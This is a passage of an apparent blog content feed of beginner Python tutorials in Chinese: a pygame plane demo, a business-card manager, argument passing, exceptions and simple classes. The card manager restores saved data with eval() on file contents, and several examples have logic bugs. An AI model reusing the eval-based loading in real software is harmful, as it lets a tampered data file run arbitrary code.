class="line"></span><br><span class="line">    def move_right(self):</span><br><span class="line">        self.x += 5</span><br><span class="line"></span><br><span class="line">def keyboard(hero_temp):</span><br><span class="line">    for event in pygame.event.get():</span><br><span class="line">        if event.type == QUIT:</span><br><span class="line">            print(&quot;exit&quot;)</span><br><span class="line">            exit()</span><br><span class="line">        elif event.type == KEYDOWN:</span><br><span class="line">            if event.key == K_a or event.key == K_LEFT:</span><br><span class="line">                print(&apos;left&apos;)</span><br><span class="line">                hero_temp.move_left()</span><br><span class="line">            elif event.key == K_d or event.key == K_RIGHT:</span><br><span class="line">                print(&apos;right&apos;)</span><br><span class="line">                hero_temp.move_right()</span><br><span class="line">            elif event.key == K_SPACE:</span><br><span class="line">                print(&apos;space&apos;)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 创建窗口,(480,852)为分辨率，0,32固定的解码。</span><br><span class="line">    screen = pygame.display.set_mode((480,852),0,32)</span><br><span class="line">    # 创建背景图片，当前目录下的plane文件夹下的背景图</span><br><span class="line">    background = pygame.image.load(&quot;./plane/background.png&quot;)</span><br><span class="line">    # 创建一个飞机对象，传入screen</span><br><span class="line">    hero = Plane(screen)</span><br><span class="line">    while True:</span><br><span class="line">        screen.blit(background, (0,0))</span><br><span class="line">        hero.display()</span><br><span class="line">        pygame.display.update()</span><br><span class="line">        # 创建一个键盘对象，传入飞机对象</span><br><span class="line">        keyboard(hero)</span><br><span class="line">        time.sleep(0.01)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 名片管理保存到文件中</title>
      <link href="/article/python-list-application-save.html"/>
      <url>/article/python-list-application-save.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">def menu():</span><br><span class="line">    print (&apos;名片管理系统 1.0&apos;)</span><br><span class="line">    print (&apos;1.添加一个名片&apos;)</span><br><span class="line">    print (&apos;2.删除一个名片&apos;)</span><br><span class="line">    print (&apos;3.修改一个名片&apos;)</span><br><span class="line">    print (&apos;4.查询一个名片&apos;)</span><br><span class="line">    print (&apos;5.列出所有名片&apos;)</span><br><span class="line">    print (&apos;6.保存退出系统&apos;)</span><br><span class="line">    print (&apos;7.删除库并跑路&apos;)</span><br><span class="line"></span><br><span class="line">def input_card():</span><br><span class="line">    name = input(&apos;请输入姓名：&apos;)</span><br><span class="line">    contact = input(&apos;请输入微信：&apos;)</span><br><span class="line">    phone = input(&apos;请输入电话：&apos;)</span><br><span class="line">    address = input(&apos;请输入地址：&apos;)</span><br><span class="line">    card = &#123;&#125;</span><br><span class="line">    card[&apos;name&apos;] = name</span><br><span class="line">    card[&apos;contact&apos;] = contact</span><br><span class="line">    card[&apos;phone&apos;] = phone</span><br><span class="line">    card[&apos;address&apos;] = address</span><br><span class="line">    return card</span><br><span class="line"></span><br><span class="line">def see_card(card_list):</span><br><span class="line">    print(&apos;名字\t微信\t电话\t地址&apos;)</span><br><span class="line">    for all_card in card_list:</span><br><span class="line">        print(&apos;%s\t%s\t%s\t%s&apos;%(all_card[&apos;name&apos;],all_card[&apos;contact&apos;],all_card[&apos;phone&apos;],all_card[&apos;address&apos;]))</span><br><span class="line"></span><br><span class="line">def sign_out():</span><br><span class="line">    save_list()</span><br><span class="line">    print(&apos;感谢使用本系统，再见！&apos;)</span><br><span class="line"></span><br><span class="line">def del_card():</span><br><span class="line">    mun = int(input(&apos;请再次输入数字1确认删数据库：&apos;))</span><br><span class="line">    if mun == 1:</span><br><span class="line">        card_list.clear()</span><br><span class="line">        print(&apos;已删除数据库，系统已自动报警，谁也跑不了！&apos;)</span><br><span class="line"></span><br><span class="line">def find_name(card_list):</span><br><span class="line">    find_name = input(&apos;请输入你要查询的名片：&apos;)</span><br><span class="line">    find_flag = 1</span><br><span class="line">    for all_card in card_list:</span><br><span class="line">        if find_name == all_card[&apos;name&apos;]:</span><br><span class="line">            print(&apos;%s\t%s\t%s\t%s&apos;%(all_card[&apos;name&apos;],all_card[&apos;contact&apos;],all_card[&apos;phone&apos;],all_card[&apos;address&apos;]))</span><br><span class="line">            find_flag = 0</span><br><span class="line"></span><br><span class="line">            if find_flag == 1:</span><br><span class="line">                print(&apos;该名片不存在！&apos;)</span><br><span class="line"></span><br><span class="line">def del_name(card_list):</span><br><span class="line">    del_name = input(&apos;请输入你要删除的名字：&apos;)</span><br><span class="line">    x = -1</span><br><span class="line">    for all_card in card_list:</span><br><span class="line">        x += 1</span><br><span class="line">        if del_name == all_card[&apos;name&apos;]:</span><br><span class="line">            del card_list[x]</span><br><span class="line">            print(&quot;名片已删除&quot;)</span><br><span class="line"></span><br><span class="line">def edit_name(card_list):</span><br><span class="line">    edit_name = input(&apos;请输入你要修改的名字：&apos;)</span><br><span class="line">    x = -1</span><br><span class="line">    for all_card in card_list:</span><br><span class="line">        x += 1</span><br><span class="line">        if edit_name == all_card[&apos;name&apos;]:</span><br><span class="line">            card_list[x] = input_card()</span><br><span class="line"></span><br><span class="line">def load_date():</span><br><span class="line">    global card_list</span><br><span class="line">    try:</span><br><span class="line">        f = open(&quot;backup.data&quot;)</span><br><span class="line">        card_list = eval(f.read())</span><br><span class="line">        f.close()</span><br><span class="line">    except Exception:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def save_list():</span><br><span class="line">    &quot;&quot;&quot;把已经添加的信息保存到文件中&quot;&quot;&quot;</span><br><span class="line">    f = open(&quot;backup.data&quot;, &quot;w&quot;)</span><br><span class="line">    f.write(str(card_list))</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    load_date()</span><br><span class="line">    menu()</span><br><span class="line">    while True:</span><br><span class="line">        mun = input(&apos;请输入功能序号：&apos;)</span><br><span class="line">        if mun.isdigit():</span><br><span class="line">            mun = int(mun)</span><br><span class="line">        else:</span><br><span class="line">            print(&apos;请输入正确的功能序号！&apos;)</span><br><span class="line"></span><br><span class="line">        if mun == 1:</span><br><span class="line">            card_list.append(input_card())</span><br><span class="line">        if mun == 2:</span><br><span class="line">            del_name(card_list)</span><br><span class="line">        if mun == 3:</span><br><span class="line">            edit_name(card_list)</span><br><span class="line">        if mun == 4:</span><br><span class="line">            find_name(card_list)</span><br><span class="line">        if mun == 5:</span><br><span class="line">            see_card(card_list)</span><br><span class="line">        if mun == 6:</span><br><span class="line">            sign_out()</span><br><span class="line">            break</span><br><span class="line">        if mun == 7:</span><br><span class="line">            del_card()</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    card_list = []</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 给程序传参</title>
      <link href="/article/python-argv.html"/>
      <url>/article/python-argv.html</url>
      
        <content type="html"><![CDATA[<h3 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">name = sys.argv[1]</span><br><span class="line">passwd = sys.argv[2]</span><br><span class="line">print (&apos;用户名：%s \n密码：%s&apos; % (name,passwd))</span><br></pre></td></tr></table></figure><h3 id="等参"><a href="#等参" class="headerlink" title="等参"></a>等参</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name = input(&apos;请输入用户名：&apos;)</span><br><span class="line">passwd = input(&apos;请输入密码：&apos;)</span><br><span class="line">print (&apos;用户名：%s \n密码：%s&apos; % (name,passwd))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 异常处理</title>
      <link href="/article/python-exception.html"/>
      <url>/article/python-exception.html</url>
      
        <content type="html"><![CDATA[<h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    num = input(&quot;请输入功能序号:&quot;)</span><br><span class="line">    int(num)</span><br><span class="line"></span><br><span class="line">except (NameError,FileNotFoundError):</span><br><span class="line">    print(&quot;如果捕获到异常后做的处理....&quot;)</span><br><span class="line"></span><br><span class="line">except Exception as e:</span><br><span class="line">    print(&quot;如果用了Exception,那么意味着只要上面的Except没有捕获到异常,这个Except一定会捕获到！&quot;)</span><br><span class="line">    print(e)</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">    print(&quot;没有异常才会执行的功能&quot;)</span><br><span class="line"></span><br><span class="line">finally:</span><br><span class="line">    print(&quot;------无论是否有异常，都执行代码！-----&quot;)</span><br><span class="line"></span><br><span class="line">print(&quot;这里不受异常影响！&quot;)</span><br></pre></td></tr></table></figure><h3 id="自定义异常"><a href="#自定义异常" class="headerlink" title="自定义异常"></a>自定义异常</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class ShortInputException(Exception):</span><br><span class="line">    &apos;&apos;&apos;自定义的异常类&apos;&apos;&apos;</span><br><span class="line">    def __init__(self, length, atleast):</span><br><span class="line">        #super().__init__()</span><br><span class="line">        self.length = length</span><br><span class="line">        self.atleast = atleast</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    try:</span><br><span class="line">        s = input(&apos;请输入 --&gt; &apos;)</span><br><span class="line">        if len(s) &lt; 3:</span><br><span class="line">            # raise引发一个你定义的异常</span><br><span class="line">            raise ShortInputException(len(s), 3)</span><br><span class="line">    except ShortInputException as result:#x这个变量被绑定到了错误的实例</span><br><span class="line">        print(&apos;ShortInputException: 输入的长度是 %d,长度至少应是 %d&apos;% (result.length, result.atleast))</span><br><span class="line">    else:</span><br><span class="line">        print(&apos;没有异常发生.&apos;)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 面对对象实现对象插对象</title>
      <link href="/article/python-class-in-class-application.html"/>
      <url>/article/python-class-in-class-application.html</url>
      
        <content type="html"><![CDATA[<p>注意：加入的对象函数，不能和主对象的函数有冲突。否则会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"># 图书馆功能:</span><br><span class="line"># 类：</span><br><span class="line">#     定义一个书架</span><br><span class="line">#     定义一本书籍</span><br><span class="line"># 实现书籍加入书架</span><br><span class="line"></span><br><span class="line">class Bookshelf:</span><br><span class="line">    def __init__(self,address_name,area_name):</span><br><span class="line">        self.address = address_name</span><br><span class="line">        self.area = area_name</span><br><span class="line">        self.in_area = area_name</span><br><span class="line">        self.left_area = area_name</span><br><span class="line">        self.bookname = []</span><br><span class="line"></span><br><span class="line">    def __str__(self):</span><br><span class="line">        return &apos;书架在%d楼，总共添加了%d本书，书名：%s，一共%s本书，还可以存放%d本书！&apos;%(self.address,self.in_area,str(self.bookname),self.in_area,self.left_area)</span><br><span class="line"></span><br><span class="line">    def addbook(self,item):</span><br><span class="line">        self.in_area = item.bookmun</span><br><span class="line">        self.left_area -= item.bookmun</span><br><span class="line">        self.bookname.append(item.bookname)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Book:</span><br><span class="line">    def __init__(self,book_name,book_mun):</span><br><span class="line">        self.bookname = book_name</span><br><span class="line">        self.bookmun = book_mun</span><br><span class="line"></span><br><span class="line">    # def __str__(self):</span><br><span class="line">    #     return &apos;添加书籍：%s，共计%d本！&apos;%(self.bookname,self.bookmun)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bookshelf = Bookshelf(3,100)</span><br><span class="line"># print(bookshelf)</span><br><span class="line"></span><br><span class="line">book = Book(&apos;非暴力沟通&apos;,5)</span><br><span class="line"># print(book)</span><br><span class="line"></span><br><span class="line">bookshelf.addbook(book)</span><br><span class="line"># print(bookshelf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">book2 = Book(&apos;人性的弱点&apos;,12)</span><br><span class="line">bookshelf.addbook(book2)</span><br><span class="line">print(bookshelf)</span><br></pre></td></tr></table></figure><h3 id="隐藏对象的属性-私有属性"><a href="#隐藏对象的属性-私有属性" class="headerlink" title="隐藏对象的属性-私有属性"></a>隐藏对象的属性-私有属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"># 图书馆功能:</span><br><span class="line"># 类：</span><br><span class="line">#     定义一个书架</span><br><span class="line">#     定义一本书籍</span><br><span class="line"># 实现书籍加入书架</span><br><span class="line"></span><br><span class="line">class Bookshelf:</span><br><span class="line">    def __init__(self,address_name,area_name):</span><br><span class="line">        self.address = address_name</span><br><span class="line">        self.area = area_name</span><br><span class="line">        self.in_area = area_name</span><br><span class="line">        self.left_area = area_name</span><br><span class="line">        self.bookname = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def __str__(self):</span><br><span class="line">        return &apos;书架在%d楼，总共添加了%d本书，书名：%s，一共%s本书，还可以存放%d本书！&apos;%(self.address,self.in_area,str(self.bookname),self.in_area,self.left_area)</span><br><span class="line"></span><br><span class="line">    def addbook(self,item):</span><br><span class="line">        #隐藏对象的属性-私有属性</span><br><span class="line">        self.bookname.append(item.book_name())</span><br><span class="line">        self.in_area = item.book_mun()</span><br><span class="line">        self.left_area -= item.book_mun()</span><br><span class="line"></span><br><span class="line">class Book:</span><br><span class="line">    def __init__(self,book_name,book_mun):</span><br><span class="line">        self.bookname = book_name</span><br><span class="line">        self.bookmun = book_mun</span><br><span class="line"></span><br><span class="line">    # def __str__(self):</span><br><span class="line">    #     return &apos;添加书籍：%s，共计%d本！&apos;%(self.bookname,self.bookmun)</span><br><span class="line">    def book_name(self):</span><br><span class="line">        return self.bookname</span><br><span class="line"></span><br><span class="line">    def book_mun(self):</span><br><span class="line">        return self.bookmun</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bookshelf = Bookshelf(3,100)</span><br><span class="line"># print(bookshelf)</span><br><span class="line"></span><br><span class="line">book = Book(&apos;非暴力沟通&apos;,5)</span><br><span class="line"># print(book)</span><br><span class="line"></span><br><span class="line">bookshelf.addbook(book)</span><br><span class="line"># print(bookshelf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">book2 = Book(&apos;人性的弱点&apos;,12)</span><br><span class="line">bookshelf.addbook(book2)</span><br><span class="line">print(bookshelf)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 面对对象烤地鼠</title>
      <link href="/article/python-class-application.html"/>
      <url>/article/python-class-application.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">class Roastmouse:</span><br><span class="line">    &apos;&apos;&apos;定义一只地鼠&apos;&apos;&apos;</span><br><span class="line">    #设置默认属性</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.roaststatus = &apos;生的&apos;</span><br><span class="line">        self.roasttime = 0</span><br><span class="line">        #为了能够存储多个数据,往往在开发中让一个属性是列表</span><br><span class="line">        self.ingredients = []</span><br><span class="line"></span><br><span class="line">    def __str__(self):</span><br><span class="line">        return &apos;目前已经烤了%s分钟，现在已经%s,距离烤糊还有%s分钟。目前添加了配料：%s！&apos;%(self.roasttime,self.roaststatus,(9-self.roasttime),str(self.ingredients))</span><br><span class="line"></span><br><span class="line">    def roastmouse(self,time):</span><br><span class="line">        #因为这个方法被调用了多次,为了能够在一次调用这个方法的时候 能够 获取到上一次调用这个方法时的time</span><br><span class="line">        #所以需要在此,把time保存到这个对象的属性中,因为属性不会随着方法的调用而结束(一个方法被调用的时候</span><br><span class="line">        #是可以用局部变量来保存数据的,但是当这个方法定义结束之后这个方法中的所有数据就没有了)</span><br><span class="line">        self.roasttime += time</span><br><span class="line">        if 0 &lt;= self.roasttime &lt; 3:</span><br><span class="line">            self.roaststatus = &apos;生的&apos;</span><br><span class="line">        if 3 &lt;= self.roasttime &lt; 5:</span><br><span class="line">            self.roaststatus = &apos;半熟&apos;</span><br><span class="line">        if 5 &lt;= self.roasttime &lt; 8:</span><br><span class="line">            self.roaststatus = &apos;熟了&apos;</span><br><span class="line">        if 8 &lt; self.roasttime:</span><br><span class="line">            self.roaststatus = &apos;糊了&apos;</span><br><span class="line"></span><br><span class="line">    def addingredients(self,item):</span><br><span class="line">        #因为item这个变量指向了一个配料,所以接下来需要将item放到append里面</span><br><span class="line">        self.ingredients.append(item)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mouse = Roastmouse()</span><br><span class="line">mouse.roastmouse(7)</span><br><span class="line">mouse.addingredients(&apos;老鼠药&apos;)</span><br><span class="line">print(mouse)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 面对对象</title>
      <link href="/article/python-class.html"/>
      <url>/article/python-class.html</url>
      
        <content type="html"><![CDATA[<h3 id="类的构成"><a href="#类的构成" class="headerlink" title="类的构成"></a>类的构成</h3><p>类(Class) 由三个部分构成</p><p>类的名称:类名<br>类的属性:一组数据<br>类的方法:允许对进行操作的方法 (行为)</p><h3 id="定义一个类"><a href="#定义一个类" class="headerlink" title="定义一个类"></a>定义一个类</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class 类名（大写）:</span><br><span class="line">    #属性</span><br><span class="line">    #方法</span><br></pre></td></tr></table></figure><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class Cat:</span><br><span class="line"></span><br><span class="line">    #属性</span><br><span class="line"></span><br><span class="line">    #方法（可由函数组成，必须加上self）</span><br><span class="line">    def eat(self):</span><br><span class="line">        print(&quot;猫在吃鱼...&quot;)</span><br><span class="line"></span><br><span class="line">    def drink(self):</span><br><span class="line">        print(&quot;猫正在喝水...&quot;)</span><br></pre></td></tr></table></figure><h3 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class 类名（大写）:</span><br><span class="line">    #属性</span><br><span class="line">    #方法</span><br><span class="line">#创建对象</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class Cat:</span><br><span class="line">    #属性</span><br><span class="line">    #方法（可由函数组成，必须加上self）</span><br><span class="line">    def eat(self):</span><br><span class="line">        print(&quot;猫在吃鱼...&quot;)</span><br><span class="line"></span><br><span class="line">    def drink(self):</span><br><span class="line">        print(&quot;猫正在喝水...&quot;)</span><br><span class="line"></span><br><span class="line">#创建对象</span><br><span class="line">tom = Cat()</span><br></pre></td></tr></table></figure><h3 id="调用对象"><a href="#调用对象" class="headerlink" title="调用对象"></a>调用对象</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class Cat:</span><br><span class="line">    #属性</span><br><span class="line">    #方法（可由函数组成，必须加上self）</span><br><span class="line">    def eat(self):</span><br><span class="line">        print(&quot;猫在吃鱼...&quot;)</span><br><span class="line"></span><br><span class="line">    def drink(self):</span><br><span class="line">        print(&quot;猫正在喝水...&quot;)</span><br><span class="line"></span><br><span class="line">#创建对象</span><br><span class="line">tom = Cat()</span><br><span class="line"></span><br><span class="line">#调用对象</span><br><span class="line">tom.eat()</span><br><span class="line">tom.drink()</span><br></pre></td></tr></table></figure><h3 id="类属性"><a href="#类属性" class="headerlink" title="类属性"></a>类属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class 类名（大写）:</span><br><span class="line">    #属性（相对于变量）</span><br><span class="line">    #方法</span><br><span class="line">#创建对象</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class Cat:</span><br><span class="line">    #属性</span><br><span class="line">    #方法（可由函数组成，必须加上self）</span><br><span class="line">    def eat(self):</span><br><span class="line">        print(&quot;猫在吃鱼...&quot;)</span><br><span class="line"></span><br><span class="line">    def drink(self):</span><br><span class="line">        print(&quot;猫正在喝水...&quot;)</span><br><span class="line"></span><br><span class="line">#创建对象</span><br><span class="line">tom = Cat()</span><br><span class="line"></span><br><span class="line">#调用tom指向的对象中的方法</span><br><span class="line">tom.eat()</span><br><span class="line">tom.drink()</span><br><span class="line"></span><br><span class="line">##给tom指向的对象添加2个属性（相对于变量）</span><br><span class="line">tom.name = &quot;汤姆&quot;</span><br><span class="line">tom.age = 40</span><br></pre></td></tr></table></figure><h3 id="定义多个对象"><a href="#定义多个对象" class="headerlink" title="定义多个对象"></a>定义多个对象</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 